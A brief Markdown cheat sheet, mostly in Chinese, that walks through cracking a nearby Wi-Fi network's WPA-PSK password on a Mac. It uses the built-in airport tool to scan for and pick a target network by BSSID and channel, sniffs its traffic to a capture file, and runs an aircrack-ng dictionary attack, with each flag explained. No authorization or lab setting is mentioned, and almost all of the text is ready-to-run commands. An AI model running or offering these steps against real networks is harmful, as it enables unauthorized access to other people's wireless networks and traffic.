# Mac Airport Aircrack-ng

`sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport`

`sudo airport -s`
> 扫描wifi

　其中，我们先找到我们需要破解的Wi-Fi名字，纪录下来BSSID，CHANNEL和SECURITY信息，后面会用到。BSSID就是我们目标Wi-Fi发射器的Mac地址。

`sudo airport en0 sniff 11`

`/tmp/airportSniff*.cap`

```
brew install aircrack-ng
brew install crunch # optional
```

`aircrack-ng -w dic.txt -M 100 -f 80 -1 -a 2 -b **:**:**:**:**:** /tmp/airportSniff*.cap`

```
参数说明：

　　- -w 指定字典文件
　　- -M 指定最大IVs，根据提示可以适当调大次参数
　　- -f 暴力破解因子，默认2，也可适当调大
　　- -a 加密类型，1:WEP, 2:WPA-PSK
　　- -b BSSID，刚刚记录目标Wi-Fi的Mac地址
```

---

`sudo airport en0 sniff 6`
> 监听